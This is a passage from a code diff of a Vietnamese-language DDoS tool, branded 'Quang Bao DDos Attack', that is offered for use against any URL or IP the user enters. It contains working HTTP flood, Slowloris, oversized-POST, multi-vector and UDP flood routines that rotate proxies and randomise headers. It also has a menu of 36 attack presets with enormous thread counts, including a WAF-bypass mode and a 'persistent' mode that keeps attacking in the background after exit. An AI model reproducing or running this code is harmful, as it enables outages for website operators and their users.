+                console.print(f"[error][QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][QUÁ TẢI 429/403] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][QUÁ TẢI 429/403] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.0005)
+
+# 522 Blitz attack
+def blitz_522_attack(url, request_count):
+    session = requests.Session()
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * 204800
+            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
+            if response.status_code == 522:
+                console.print(f"[error][BLITZ 522] Tấn công: Mã trạng thái 522 - KẾT NỐI MỤC TIÊU NGẮT![/]")
+            else:
+                console.print(f"[warning][BLITZ 522] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][BLITZ 522] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.0003)
+
+# Combined attack
+def combined_all_attack(url, request_count):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * random.randint(102400, 204800)
+            attack_type = random.choice(["slowloris", "flood", "overload", "blitz", "http2", "keep_alive"])
+            if attack_type == "slowloris":
+                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
+                console.print(f"[error][KẾT HỢP] Tấn công: Kết nối Slowloris giữ[/]")
+                time.sleep(0.01)
+                sock.close()
+            elif attack_type == "flood":
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
+                console.print(f"[error][KẾT HỢP] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "overload":
+                method = random.choice(methods)
+                if method == "GET":
+                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+                elif method == "POST":
+                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
+                else:
+                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+                if response.status_code in (429, 403):
+                    console.print(f"[error][KẾT HỢP] Tấn công: 429/403 - MỤC TIÊU QUÁ TẢI[/]")
+                else:
+                    console.print(f"[warning][KẾT HỢP] Tấn công: 429/403 - Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "blitz":
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
+                if response.status_code == 522:
+                    console.print(f"[error][KẾT HỢP] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT![/]")
+                else:
+                    console.print(f"[warning][KẾT HỢP] Tấn công: 522 - Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "http2" and HTTP2_AVAILABLE:
+                http2_multiplexing_attack(url)
+            else:
+                keep_alive_pipelining_attack(url)
+        except Exception as e:
+            console.print(f"[error][KẾT HỢP] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(random.uniform(0.0002, 0.001))
+
+# Layer 3/4 UDP Flood and Amplification attack
+def layer3_4_attack(host, port, request_count):
+    udp_flood_attack(host, port)
+
+# Multi-vector attack
+def multi_vector_attack(url, request_count):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    parsed_url = urllib.parse.urlparse(url)
+    host = parsed_url.hostname
+    port = parsed_url.port or 80
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            attack_type = random.choice(["slowloris", "flood", "overload", "blitz", "layer3_4", "http2", "keep_alive"])
+            if attack_type == "slowloris":
+                sock = session.get(url, headers=headers, proxies=proxy, timeout=30, stream=True)
+                console.print(f"[error][ĐA VECTOR] Tấn công: Kết nối Slowloris giữ[/]")
+                time.sleep(0.01)
+                sock.close()
+            elif attack_type == "flood":
+                payload = "X" * random.randint(102400, 204800)
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
+                console.print(f"[error][ĐA VECTOR] Tấn công: HTTP Flood - Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "overload":
+                method = random.choice(methods)
+                if method == "GET":
+                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+                elif method == "POST":
+                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
+                else:
+                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+                console.print(f"[warning][ĐA VECTOR] Tấn công: Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "blitz":
+                payload = "X" * 204800
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
+                if response.status_code == 522:
+                    console.print(f"[error][ĐA VECTOR] Tấn công: 522 - KẾT NỐI MỤC TIÊU NGẮT![/]")
+                else:
+                    console.print(f"[warning][ĐA VECTOR] Tấn công: Mã trạng thái {response.status_code}[/]")
+            elif attack_type == "layer3_4":
+                layer3_4_attack(host, port, request_count)
+            elif attack_type == "http2" and HTTP2_AVAILABLE:
+                http2_multiplexing_attack(url)
+            else:
+                keep_alive_pipelining_attack(url)
+        except Exception as e:
+            console.print(f"[error][ĐA VECTOR] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(random.uniform(0.0002, 0.001))
+
+# Target configurations
+TARGET_CONFIGS = [
+    {"id": "1", "name": "basic", "threads": 100, "requests": 100, "desc": "Tấn công cơ bản", "level": "Thấp", "application": "Kiểm tra mục tiêu"},
+    {"id": "2", "name": "medium", "threads": 500, "requests": 500, "desc": "Tấn công trung bình", "level": "Thấp-Trung bình", "application": "Máy chủ nhỏ"},
+    {"id": "3", "name": "advanced", "threads": 1000, "requests": 1000, "desc": "Tấn công nâng cao", "level": "Trung bình", "application": "Máy chủ vừa"},
+    {"id": "4", "name": "ultra", "threads": 10000, "requests": 1000, "desc": "Tấn công siêu mạnh", "level": "Trung bình-Cao", "application": "Mục tiêu bảo vệ tốt"},
+    {"id": "5", "name": "infinite", "threads": 2000, "requests": 1000, "desc": "Tấn công vòng lặp", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
+    {"id": "6", "name": "unlimited", "threads": 10000, "requests": 1000, "desc": "Tấn công vô hạn", "level": "Trung bình-Cao", "application": "Tấn công liên tục"},
+    {"id": "7", "name": "overload", "threads": 15000, "requests": 2000, "desc": "Tấn công quá tải 429/403", "level": "Cao", "application": "Hệ thống giới hạn"},
+    {"id": "8", "name": "blitz", "threads": 20000, "requests": 3000, "desc": "Tấn công chớp nhoáng 522", "level": "Cao", "application": "Gián đoạn kết nối"},
+    {"id": "9", "name": "layer3_4", "threads": 20000, "requests": 5000, "desc": "Tấn công UDP tầng 3/4", "level": "Cao", "application": "Gián đoạn mạng"},
+    {"id": "10", "name": "combined", "threads": 25000, "requests": 4000, "desc": "Tấn công đa kỹ thuật", "level": "Cao", "application": "Mục tiêu phức tạp"},
+    {"id": "11", "name": "layer7", "threads": 25000, "requests": 4000, "desc": "Tấn công tầng 7", "level": "Cao", "application": "Quá tải web"},
+    {"id": "12", "name": "multi_vector", "threads": 30000, "requests": 6000, "desc": "Tấn công đa vector", "level": "Rất Cao", "application": "Mục tiêu lớn"},
+    {"id": "13", "name": "god", "threads": 30000, "requests": 1000, "desc": "Tấn công cấp thần", "level": "Rất Cao", "application": "Mục tiêu bảo mật cao"},
+    {"id": "14", "name": "hyper", "threads": 10000000, "requests": 1000, "desc": "Tấn công siêu tốc", "level": "Cực Cao", "application": "Hệ thống lớn"},
+    {"id": "15", "name": "supra", "threads": 20000000, "requests": 1000, "desc": "Tấn công tối cao", "level": "Cực Cao", "application": "Mục tiêu siêu lớn"},
+    {"id": "16", "name": "pulsar", "threads": 30000000, "requests": 1000, "desc": "Tấn công pulsar", "level": "Cực Cao", "application": "Hệ thống phân tán"},
+    {"id": "17", "name": "quasar", "threads": 35000000, "requests": 1000, "desc": "Tấn công quasar", "level": "Cực Cao", "application": "Hệ thống CDN"},
+    {"id": "18", "name": "prime", "threads": 50000000, "requests": 1000, "desc": "Tấn công prime", "level": "Cực Cao", "application": "Hệ thống tải cao"},
+    {"id": "19", "name": "cosmic", "threads": 60000000, "requests": 1000, "desc": "Tấn công cosmic", "level": "Cực Cao", "application": "Hệ thống lớn"},
+    {"id": "20", "name": "ultima", "threads": 100000000, "requests": 1000, "desc": "Tấn công tối thượng", "level": "Cực Cao", "application": "Hệ thống doanh nghiệp"},
+    {"id": "21", "name": "nova", "threads": 100000000, "requests": 1000, "desc": "Tấn công supernova", "level": "Cực Cao", "application": "Hệ thống tải lớn"},
+    {"id": "22", "name": "titan", "threads": 5000000, "requests": 1000, "desc": "Tấn công titan", "level": "Cực độ", "application": "Hệ thống siêu lớn"},
+    {"id": "23", "name": "void", "threads": 234000000, "requests": 1000, "desc": "Tấn công void", "level": "Cực độ", "application": "Mục tiêu siêu bền"},
+    {"id": "24", "name": "abyss", "threads": 700000000, "requests": 1000, "desc": "Tấn công abyss", "level": "Cực độ", "application": "Hệ thống quốc gia"},
+    {"id": "25", "name": "omega", "threads": 1000000000, "requests": 1000, "desc": "Tấn công omega", "level": "Cực độ", "application": "Hệ thống siêu bảo mật"},
+    {"id": "26", "name": "giga", "threads": 1000000000000, "requests": 1000, "desc": "Tấn công giga", "level": "Tối đa", "application": "Hệ thống toàn cầu"},
+    {"id": "27", "name": "persistent", "threads": 1000000000000, "requests": 10000, "desc": "Tấn công liên tục", "level": "Tối đa", "application": "Tấn công không ngừng"},
+    {"id": "28", "name": "http2", "threads": 10000, "requests": 1000, "desc": "Tấn công HTTP/2", "level": "Cao", "application": "Máy chủ HTTP/2"},
+    {"id": "29", "name": "keep_alive", "threads": 10000, "requests": 1000, "desc": "Tấn công keep-alive", "level": "Cao", "application": "Máy chủ HTTP"},
+    {"id": "30", "name": "multi_proc", "threads": 20000, "requests": 2000, "desc": "Tấn công đa tiến trình", "level": "Cao", "application": "Tấn công hiệu suất"},
+    {"id": "31", "name": "multi_async", "threads": 20000, "requests": 2000, "desc": "Tấn công đa tiến trình + async", "level": "Cao", "application": "Tấn công bất đồng bộ"},
+    {"id": "32", "name": "udp_flood", "threads": 20000, "requests": 5000, "desc": "Tấn công UDP tầng 4", "level": "Cao", "application": "Tấn công mạng"},
+    {"id": "33", "name": "waf_bypass", "threads": 25000, "requests": 4000, "desc": "Tấn công vượt WAF", "level": "Cao", "application": "Bypass tường lửa web"},
+    {"id": "34", "name": "tcp_udp", "threads": 25000, "requests": 5000, "desc": "Tấn công TCP/UDP", "level": "Cao", "application": "Tấn công mạng trực tiếp"},
+    {"id": "35", "name": "ultimate_x", "threads": 30000, "requests": 6000, "desc": "Tấn công đa tầng", "level": "Rất Cao", "application": "Mục tiêu đa tầng"},
+    {"id": "36", "name": "vuln_scan", "threads": 1, "requests": 1, "desc": "Quét lỗ hổng web nâng cao", "level": "Thấp", "application": "Kiểm tra bảo mật toàn diện"}
+]
+
+# Display ordered functions
+def display_ordered_functions():
+    clear_screen()
+    display_banner()
+    table = Table(title="36 CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG (SẮP XẾP THEO CƯỜNG ĐỘ)", style="info")
+    table.add_column("ID", style="highlight")
+    table.add_column("Tên", style="success")
+    table.add_column("Mô tả")
+    table.add_column("Luồng", justify="right")
+    table.add_column("Yêu cầu", justify="right")
+    table.add_column("Tổng lượt", justify="right")
+    table.add_column("Cấp độ")
+    table.add_column("Ứng dụng")
+    sorted_configs = sorted(TARGET_CONFIGS, key=lambda x: x['threads'] * x['requests'])
+    for func in sorted_configs:
+        table.add_row(
+            func['id'],
+            func['name'].upper(),
+            func['desc'],
+            f"{func['threads']:,}",
+            f"{func['requests']:,}",
+            f"{func['threads'] * func['requests']:,}",
+            func['level'],
+            func['application']
+        )
+    console.print(table)
+    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")
+
+# Display target menu
+def display_target_menu():
+    clear_screen()
+    display_banner()
+    table = Table(title="MENU CHIẾN LƯỢC TẤN CÔNG & QUÉT LỖ HỔNG", style="info")
+    table.add_column("ID", style="highlight")
+    table.add_column("Tên", style="success")
+    table.add_column("Mô tả")
+    table.add_row("0", "Danh sách", "Xem danh sách chiến lược")
+    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
+        table.add_row(target['id'], target['name'].upper(), target['desc'])
+    console.print(table)
+
+# Display sub-menu for Ultimate-X attack
+def display_ultimate_x_menu():
+    clear_screen()
+    display_banner()
+    table = Table(title="CHỌN LOẠI TẤN CÔNG ULTIMATE-X", style="info")
+    table.add_column("ID", style="highlight")
+    table.add_column("Loại Tấn Công")
+    table.add_row("1", "Băng thông (UDP/ICMP Flood)")
+    table.add_row("2", "Giao thức (TCP SYN/ACK/RST)")
+    table.add_row("3", "Tầng ứng dụng (HTTP + WAF Bypass)")
+    console.print(table)
 
 # Main function
 def main():
-    global theme_color
-    theme_color, speed = select_theme()
-    matrix_effect(speed)
-    display_logo(theme_color)
     check_file_integrity()
-    check_auth_key(theme_color)
-    multiprocessing.set_start_method('spawn', force=True)
-
-    loop = asyncio.get_event_loop()
-    try:
-        loop.run_until_complete(filter_active_proxies(theme_color))
-        loop.create_task(refresh_proxies_periodically())
-    except Exception as e:
-        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-        console.print(f"[error]Lỗi khởi tạo proxy: [red]{error_msg}[/] [✗][/] [yellow]*ALERT*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-        exit(1)
-
+    multiprocessing.set_start_method('spawn')
     while True:
         try:
-            display_menu(theme_color)
-            choice = hacker_prompt("Chọn (1-5): ", default="1", theme_color=theme_color, choices=["1", "2", "3", "4", "5"])
+            display_target_menu()
+            choice = Prompt.ask("[info]Nhập lựa chọn (0-36)[/]")
 
-            if choice == "3":
-                console.print(f"[success]Thoát chương trình [✓][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                display_exit_banner(theme_color)
-                exit(0)
-
-            display_radar_effect(theme_color)
-            input_url = None
-            target_ip = None
-            validated_url = None
-            if choice == "5":
-                input_url = hacker_prompt("Nhập URL website (ví dụ: https://example.com): ", theme_color=theme_color)
-                if not input_url:
-                    console.print(f"[error]URL trống! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    time.sleep(1)
-                    continue
-                try:
-                    parsed_url = urllib.parse.urlparse(input_url)
-                    domain = parsed_url.hostname
-                    if not domain:
-                        raise ValueError("URL không hợp lệ")
-                    console.print(f"[success]Đang phân giải IP thông minh cho [bold {theme_color}]{domain}[/]... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    loading_animation("Phân giải IP thông minh", 2.0, theme_color)
-                    target_ip = smart_resolve_domain_to_ip(domain, theme_color)
-                    if target_ip:
-                        use_resolved_ip = Confirm.ask(f"[bold {theme_color}]Sử dụng IP [bold green]{target_ip}[/]?[/]", default=True)
-                        if not use_resolved_ip:
-                            while True:
-                                target_ip = hacker_prompt("Nhập IP thủ công: ", theme_color=theme_color)
-                                if validate_ip(target_ip):
-                                    break
-                                console.print(f"[error]IP không hợp lệ! Vui lòng nhập lại. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                                time.sleep(1)
-                    else:
-                        while True:
-                            target_ip = hacker_prompt("Không tìm thấy IP. Nhập IP thủ công: ", theme_color=theme_color)
-                            if validate_ip(target_ip):
-                                break
-                            console.print(f"[error]IP không hợp lệ! Vui lòng nhập lại. [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                            time.sleep(1)
-                    scheme = parsed_url.scheme or "http"
-                    validated_url = f"{scheme}://{target_ip}"
-                except ValueError as e:
-                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                    console.print(f"[error]Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    time.sleep(1)
-                    continue
-            else:
-                input_url = hacker_prompt("Nhập URL/IP: ", theme_color=theme_color)
-                if not input_url:
-                    console.print(f"[error]URL/IP trống! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    time.sleep(1)
-                    continue
-                try:
-                    validated_url = validate_url(input_url)
-                except ValueError as e:
-                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                    console.print(f"[error]Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    time.sleep(1)
-                    continue
-
-            host = target_ip or urllib.parse.urlparse(validated_url).hostname
-            port = urllib.parse.urlparse(validated_url).port or 80
-            panel = Panel(
-                f"[bold {theme_color}]Mục tiêu:[/] [bold green]{validated_url}[/]\n"
-                f"[bold {theme_color}]Hostname/IP:[/] [bold green]{host}[/]\n"
-                f"[bold {theme_color}]Port:[/] [bold green]{port}[/]\n"
-                f"[bold {theme_color}]Trạng thái:[/] [bold green]Đã khóa [✓][/] \n"
-                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
-                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-                title=f"[bold {theme_color}]THÔNG TIN MỤC TIÊU[/]",
-                border_style="bold cyan",
-                padding=(1, 2)
-            )
-            console.print("")
-            console.print(panel)
-
-            console.print(f"[success]Mục tiêu: [bold {theme_color}]{validated_url}[/] [✓][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-            loading_animation("Khóa mục tiêu", 1.5, theme_color)
-
-            if choice == "2":
-                console.print(f"[success]Bắt đầu quét lỗ hổng... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                loading_animation("Quét lỗ hổng", 1.5, theme_color)
-                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
-                display_vulnerability_report(vulnerabilities, theme_color)
+            if choice == "0":
+                display_ordered_functions()
                 continue
 
-            num_threads = None
-            while num_threads is None:
-                try:
-                    num_threads = int(hacker_prompt("Số luồng (1-999999): ", default="1000", theme_color=theme_color))
-                    if not (1 <= num_threads <= 999999):
-                        raise ValueError("Số luồng không hợp lệ")
-                except ValueError:
-                    console.print(f"[error]Số luồng phải từ 1-999999! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
+            if not target:
+                console.print("[error][LỖI] Lựa chọn không hợp lệ! Thử lại.[/]")
+                time.sleep(1)
+                continue
+            target_selection_effect(target['name'])
+
+            input_url = Prompt.ask("[info]Nhập URL hoặc IP mục tiêu[/]")
+            if not input_url:
+                console.print("[error][LỖI] URL/IP không được để trống! Thử lại.[/]")
+                time.sleep(1)
+                continue
+
+            try:
+                validated_url = validate_url(input_url)
+                host = urllib.parse.urlparse(validated_url).hostname
+                port = urllib.parse.urlparse(validated_url).port or 80
+            except ValueError:
+                host = input_url
+                port = 80
+                validated_url = f"http://{host}"
+                console.print(f"[warning][HỆ THỐNG] Xử lý mục tiêu như IP: {host}[/]")
+
+            console.print(f"[success][HỆ THỐNG] Mục tiêu đã khóa: {validated_url}[/]")
+
+            if target['name'] == "vuln_scan":
+                console.print("[info][HỆ THỐNG] Bắt đầu quét lỗ hổng web nâng cao...[/]")
+                loading_animation("Quét lỗ hổng web", 3)
+                loop = asyncio.get_event_loop()
+                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
+                display_vulnerability_report(vulnerabilities)
+                continue
+
+            base_threads = target['threads']
+            base_requests = target['requests']
+
+            if target['name'] == "persistent":
+                console.print("[error][CẢNH BÁO] Tấn công sẽ chạy nền kể cả sau khi thoát![/]")
+                console.print("[warning]Để dừng: Dùng 'killall python3' (Linux/Termux) hoặc Task Manager (Windows)[/]")
+
+            if target['name'] == "ultimate_x":
+                display_ultimate_x_menu()
+                attack_choice = Prompt.ask("[info]Chọn loại tấn công (1-3)[/]")
+                if attack_choice not in ["1", "2", "3"]:
+                    console.print("[error][LỖI] Lựa chọn không hợp lệ! Thử lại.[/]")
                     time.sleep(1)
+                    continue
 
-            requests_per_thread = None
-            while requests_per_thread is None:
-                try:
-                    requests_per_thread = int(hacker_prompt("Yêu cầu/luồng (1-9999999): ", default="1000", theme_color=theme_color))
-                    if not (1 <= requests_per_thread <= 9999999):
-                        raise ValueError("Số yêu cầu không hợp lệ")
-                except ValueError:
-                    console.print(f"[error]Yêu cầu phải từ 1-9999999! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    time.sleep(1)
+            if target['name'] not in ("infinite", "unlimited", "overload", "blitz", "combined", "persistent", "layer3_4", "multi_vector", "layer7", "http2", "keep_alive", "multi_proc", "multi_async", "udp_flood", "waf_bypass", "tcp_udp", "ultimate_x", "vuln_scan"):
+                confirm = Confirm.ask("[error][HỆ THỐNG] Xác nhận tấn công[/]")
+                if not confirm:
+                    console.print("[warning][HỆ THỐNG] Hủy tấn công[/]")
+                    continue
 
-            duration = None
-            duration_display = "Vô hạn"
-            if choice == "1":
-                while duration is None:
-                    try:
-                        duration = int(hacker_prompt("Thời gian (giây): ", default="60", theme_color=theme_color))
-                        if duration < 1:
-                            raise ValueError("Thời gian không hợp lệ")
-                        duration_display = f"{duration} giây"
-                    except ValueError:
-                        console.print(f"[error]Thời gian phải > 0! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        time.sleep(1)
-            elif choice in ["4", "5"]:
-                time_unit = hacker_prompt("Đơn vị thời gian (phút/giờ/vô hạn): ", default="phút", theme_color=theme_color, choices=["phút", "giờ", "vô hạn"])
-                if time_unit == "vô hạn":
-                    duration = float('inf')
-                else:
-                    while duration is None:
-                        try:
-                            duration_input = float(hacker_prompt(f"Thời gian ({time_unit}): ", default="1", theme_color=theme_color))
-                            if duration_input <= 0:
-                                raise ValueError("Thời gian không hợp lệ")
-                            if time_unit == "phút":
-                                duration = duration_input * 60
-                                duration_display = f"{duration_input} phút"
-                            elif time_unit == "giờ":
-                                duration = duration_input * 3600
-                                duration_display = f"{duration_input} giờ"
-                        except ValueError:
-                            console.print(f"[error]Thời gian phải > 0! [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                            time.sleep(1)
-
-            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)
-
-            console.print(f"[success]Đánh giá bảo mật... [⚡][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-            loading_animation("Đánh giá bảo mật", 1.5, theme_color)
-            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url, theme_color)
+            console.print("[info][HỆ THỐNG] Đang đánh giá mức độ bảo mật của mục tiêu...[/]")
+            loading_animation("Đánh giá bảo mật", 2)
+            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)
 
             if security_level == "THẤP":
-                num_threads = min(recommended_threads, num_threads // 2)
-                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
+                NUM_THREADS = min(recommended_threads, base_threads // 2)
+                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                 attack_strategy = "TẤN CÔNG NHẸ"
             elif security_level == "TRUNG BÌNH":
-                attack_strategy = "TẤN CÔNG VỪA"
+                NUM_THREADS = base_threads
+                REQUESTS_PER_THREAD = base_requests
+                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
             else:
-                num_threads = max(recommended_threads, num_threads)
-                requests_per_thread = max(recommended_requests, requests_per_thread)
-                attack_strategy = "TẤN CÔNG SIÊU CẤP"
+                NUM_THREADS = max(recommended_threads, base_threads)
+                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
+                attack_strategy = "LỰC LƯỢNG TỐI ĐA"
 
             panel = Panel(
-                f"[bold {theme_color}]Chiến lược:[/] [bold magenta]{attack_strategy}[/]\n"
-                f"[bold {theme_color}]Mục tiêu:[/] [bold green]{validated_url}[/]\n"
-                f"[bold {theme_color}]Luồng:[/] [bold green]{num_threads:,}[/]\n"
-                f"[bold {theme_color}]Yêu cầu:[/] [bold green]{requests_per_thread:,}[/]\n"
-                f"[bold {theme_color}]Thời gian:[/] [bold green]{duration_display}[/]\n"
-                f"[bold {theme_color}]Tổng:[/] [bold green]{num_threads * requests_per_thread:,}[/]\n"
-                f"[bold {theme_color}]Proxy:[/] [bold green]{len(PROXY_LIST)}[/]\n"
-                f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-                title=f"[bold {theme_color}]THÔNG TIN TẤN CÔNG[/]",
-                border_style="bold cyan",
-                padding=(1, 2)
+                f"""
+[+] CHIẾN LƯỢC TẤN CÔNG: {target['name'].upper()}
+[+] Mục tiêu: {validated_url}
+[+] Luồng: {NUM_THREADS:,}
+[+] Yêu cầu/Luồng: {REQUESTS_PER_THREAD:,}
+[+] Chiến lược: {attack_strategy}
+[+] Tổng lượt đánh: {NUM_THREADS * REQUESTS_PER_THREAD:,}
+                """,
+                title="THÔNG TIN TẤN CÔNG",
+                style="info"
             )
-            console.print("")
             console.print(panel)
-            confirm = Confirm.ask(f"[error]Xác nhận tấn công? [?][/] [yellow]*BEEP*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]", default=True)
-            if not confirm:
-                console.print(f"[warning]Hủy tấn công [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                continue
+            console.print("[error][HỆ THỐNG] Khởi động tấn công...[/]")
+            loading_animation("Khởi động hệ thống tấn công", 3)
 
-            console.print(f"[success]Khởi động tấn công siêu cấp... [⚡][/] [yellow]*BOOM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-            loading_animation("Khởi động hệ thống tấn công siêu cấp", 1.5, theme_color)
-
-            global success_count, error_count, response_times, proxy_error_count, waf_bypass_count, rps_data
-            success_count = 0
-            error_count = 0
-            response_times = []
-            proxy_error_count = 0
-            waf_bypass_count = 0
-            rps_data = []
             start_time = time.time()
 
-            with Progress(
-                SpinnerColumn(spinner_name="arc"),
-                TextColumn("[progress.description]{task.description}"),
-                BarColumn(bar_width=20, style="red", complete_style="cyan"),
-                TextColumn("[bold green]{task.completed}/{task.total}[/]"),
-                console=console
-            ) as progress:
-                task = progress.add_task(f"[bold {theme_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [⚡][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]", total=num_threads * requests_per_thread)
+            if target['name'] == "persistent":
+                save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD, target['name'])
+                processes = []
+                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):
+                    p = multiprocessing.Process(target=persistent_attack_process, args=(validated_url, REQUESTS_PER_THREAD))
+                    p.daemon = True
+                    processes.append(p)
+                    p.start()
+                console.print(f"[error][HỆ THỐNG] Tấn công liên tục bắt đầu với {len(processes)} tiến trình! Dùng 'killall python3' hoặc Task Manager để dừng.[/]")
+                time.sleep(2)
+                exit(0)
+            elif target['name'] == "unlimited":
+                unlimited_thread = threading.Thread(target=unlimited_threads_attack, args=(validated_url,))
+                unlimited_thread.start()
+                try:
+                    unlimited_thread.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công vô hạn bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "overload":
                 threads = []
-                attack_function = advanced_clog_attack
-                for _ in range(num_threads):
-                    t = threading.Thread(target=attack_function, args=(validated_url, requests_per_thread, duration, progress, task, theme_color))
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=overload_429_403_attack, args=(validated_url, REQUESTS_PER_THREAD))
                     threads.append(t)
                     t.start()
-                    time.sleep(0.01)
-
                 try:
                     for t in threads:
                         t.join()
                 except KeyboardInterrupt:
-                    console.print(f"[warning]Tấn công bị dừng [⚠][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    display_exit_banner(theme_color)
+                    console.print("[warning][HỆ THỐNG] Tấn công quá tải 429/403 bị dừng bởi người dùng[/]")
                     exit(0)
+            elif target['name'] == "blitz":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=blitz_522_attack, args=(validated_url, REQUESTS_PER_THREAD))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công chớp nhoáng 522 bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "combined":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=combined_all_attack, args=(validated_url, REQUESTS_PER_THREAD))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công kết hợp bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "layer3_4":
+                threads = []
+                for _ in range(NUM_THREADS):
+                    t = threading.Thread(target=layer3_4_attack, args=(host, port, REQUESTS_PER_THREAD))
+                    threads.append(t)
+                    t.start()
+                try:
+                    for t in threads:
+                        t.join()
+                except KeyboardInterrupt:
+                    console.print("[warning][HỆ THỐNG] Tấn công tầng 3/4 bị dừng bởi người dùng[/]")
+                    exit(0)
+            elif target['name'] == "multi_vector":
+                threads = []
